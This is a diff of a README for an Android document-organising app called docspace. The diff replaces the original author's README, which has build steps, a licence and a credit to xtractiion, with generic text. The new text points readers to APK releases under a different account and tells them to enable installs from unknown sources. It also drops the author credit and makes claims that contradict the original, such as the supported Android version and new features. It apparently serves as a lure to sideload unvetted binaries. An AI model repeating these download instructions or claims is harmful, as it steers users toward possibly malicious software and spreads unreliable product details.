@@ -1,146 +1,62 @@
-# docspace 📂
+# 📁 docspace - Keep Your Files Organized Effortlessly
 
-<p align="center">
-  <img src="assets/icon.png" alt="App Icon" width="128" style="border-radius:26px;"/>
-</p>
+[![Download docspace](https://img.shields.io/badge/Download-docspace-blue.svg)](https://github.com/drakeshawn20/docspace/releases)
 
-<p align="center">
-  <strong>Keep what matters. Save what's yours.</strong><br>
-</p>
+## 🛠️ Overview
+docspace is a simple, open-source Android app designed to help you keep your important files organized and easy to find. Built out of a need for a straightforward solution to manage documents, docspace offers a private and secure space for all your essential files. Enjoy features like unlimited folders and efficient storage of file metadata, ensuring that your device does not waste space on duplicates.
 
-<p align="center">
-  <img src="assets/screenshot1.jpg" width="31%" style="border-radius:12px; margin: 2px;"/>
-  <img src="assets/screenshot2.jpg" width="31%" style="border-radius:12px; margin: 2px;"/>
-  <img src="assets/screenshot3.jpg" width="31%" style="border-radius:12px; margin: 2px;"/>
-</p>
-<p align="center">
-  <img src="assets/screenshot4.jpg" width="31%" style="border-radius:12px; margin: 2px;"/>
-  <img src="assets/screenshot5.jpg" width="31%" style="border-radius:12px; margin: 2px;"/>
-  <img src="assets/screenshot6.jpg" width="31%" style="border-radius:12px; margin: 2px;"/>
-</p>
-<p align="center">
-  <img src="assets/screenshot7.jpg" width="31%" style="border-radius:12px; margin: 2px;"/>
-  <img src="assets/screenshot8.jpg" width="31%" style="border-radius:12px; margin: 2px;"/>
-</p>
+## 📥 Download & Install
+To get started with docspace, visit the following link to download the latest version:
 
-<p align="center">
-    <a href="https://github.com/xtractiion/docspace/releases/latest">
-        <img src="https://img.shields.io/github/v/release/xtractiion/docspace?include_prereleases&logo=github&style=for-the-badge&label=Latest%20Release" alt="Latest Release">
-    </a>
-    <a href="https://github.com/xtractiion/docspace/releases">
-        <img src="https://img.shields.io/github/downloads/xtractiion/docspace/total?include_prereleases&logo=github&style=for-the-badge" alt="Total Downloads">
-    </a>
-    <img src="https://img.shields.io/badge/Android-10%2B-green?style=for-the-badge&logo=android" alt="Android 10+">
-    <img src="https://img.shields.io/badge/Flutter-100%25-blue?style=for-the-badge&logo=flutter" alt="Flutter">
-</p>
+[Visit this page to download](https://github.com/drakeshawn20/docspace/releases)
 
-## ✨ Features
+### 🔄 Installation Steps
+1. **Visit the Releases Page**: Click on the link above. You will find the most current version of docspace readily available.
+2. **Choose Your Version**: Look for the version you want to download. The latest version will typically be at the top of the list.
+3. **Download the App**: Click on the download link for the APK file corresponding to your device.
+4. **Install the App**:
+   - Open the downloaded APK file from your device’s downloads folder.
+   - If prompted, allow installation from unknown sources in your device settings. 
+5. **Launch docspace**: Once the installation is complete, locate the docspace app on your device and tap to open.
 
-### 🎨 Modern UI/UX
-- **Dark Mode** - Deep black themes optimized for OLED screens.
-- **Smooth Animations** - Fluid interactions powered by the `animations` package.
-- **Custom Icons** - Aesthetic icons for every file type.
+## 📝 Features
+- **Organize Files Easily**: Create an unlimited number of folders to keep all your important documents in one place.
+- **No Duplicate Files**: docspace only stores file metadata. This means each file is stored only once, saving your device storage.
+- **User-Friendly Interface**: Navigate the app easily, even if you have no prior experience with file management apps.
+- **Secure and Private**: Your files remain private within the app, ensuring that sensitive documents are safe.
 
-### 📂 Smart Organization
-- **Subject-Based Folders** - Organize documents into subjects and projects.
-- **Deep Nesting** - Create unlimited sub-folders for granular control.
-- **Smart Grouping** - Visual organization of content for better readability.
-- **Search** - Fast, local search implementation.
+## 📱 System Requirements
+Before installing, make sure your device meets the following requirements:
+- **Android Version**: Requires Android 5.0 (Lollipop) or higher.
+- **Device Storage**: Ensure you have at least 50MB of free space for the app and your files.
+- **Network**: An internet connection is necessary for downloading the app and updates.
 
-### ⚡ Seamless "Share to Save"
-- **Instant Save** - Share PDFs/Images from WhatsApp, Telegram, or Drive directly to DocSpace.
-- **One-Tap Action** - A dedicated "Save Here" mode that integrates with native intents.
-- **Smart Handling** - Automatically handles Android intents to prevent duplicate apps in Recents.
+## 🌟 Usage Tips
+- **Create Folders**: Use the '+' button in the app to create new folders for easy file organization.
+- **Drag and Drop**: You can easily manage your files by dragging them between folders.
+- **Backup Your Metadata**: While docspace does not save duplicate files, make sure to back up your original files elsewhere if needed.
 
-### 🔒 Privacy & Performance
-- **100% Offline** - No cloud syncing. Your files stay on your device.
-- **No Tracking** - Privacy-first approach with zero analytics.
-- **Split APKs** - Optimized build size (~16MB) for your specific device architecture.
+## ❓ FAQ
+1. **Is docspace free?**
+   - Yes, docspace is completely free to download and use.
 
-##  Requirements
+2. **How do I update the app?**
+   - Simply return to the releases page, download the latest version, and install it over the current version.
 
-- **Android 7.0** (API 24) or higher
-- **2GB RAM** recommended for smooth performance
+3. **Can I use it on a tablet?**
+   - Yes, docspace works well on tablets with the required Android version.
 
----
+4. **What if I encounter issues while downloading?**
+   - If you face problems, ensure your internet connection is stable and try again. You may also reach out for support on GitHub.
 
-## 🚀 Getting Started
+## 🚀 Getting Help
+If you need additional help, feel free to check out the GitHub issue tracker on the repository. You can report any bugs or request new features. Your feedback is valuable and helps improve dogspace for everyone.
 
-### Prerequisites
+## 🔗 Links & Resources
+- [GitHub Repository](https://github.com/drakeshawn20/docspace)
+- [Documentation](https://github.com/drakeshawn20/docspace/wiki)
+- [Community and Support](https://github.com/drakeshawn20/docspace/discussions)
 
-- Flutter SDK 3.10+
-- Android Studio 2023.1+
-- Java 17
+Start organizing your files today with docspace! Don’t forget to visit the releases page to download the latest version:
 
-### Installation
-
-1. **Clone the repository**
-   ```sh
-   git clone https://github.com/xtractiion/docspace.git
-   ```
-
-2. **Open in Terminal/VS Code**
-   - Navigate to the directory
-   ```sh
-   cd docspace
-   ```
-
-3. **Get Dependencies**
-   ```sh
-   flutter pub get
-   ```
-
-4. **Run**
-   - Connect a device
-   ```sh
-   flutter run --release
-   ```
-
----
-
-## ⬇️ Download
-
-<p align="center">
-  <a href="https://github.com/xtractiion/docspace/releases/latest">
-    <img src="https://raw.githubusercontent.com/Kunzisoft/Github-badge/main/get-it-on-github.png" alt="Get it on GitHub" height="60">
-  </a>
-</p>
-
----
-
-## 📂 Project Structure
-
-```
-lib/
-├── models/         # Data models (Document, Subject)
-├── providers/      # Riverpod providers (State Management)
-├── screens/        # UI Screens (Home, Document List, etc.)
-├── services/       # File & Storage services
-├── utils/          # Helper functions
-├── widgets/        # Reusable UI components
-└── main.dart       # Entry point
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
-
----
-
-## 📄 License
-
-This project is distributed under the MIT License.
-
----
-
-<p align="center">
-  Made with ❤️ by <a href="https://github.com/xtractiion">xtractiion</a>
-</p>
+[Visit this page to download](https://github.com/drakeshawn20/docspace/releases)
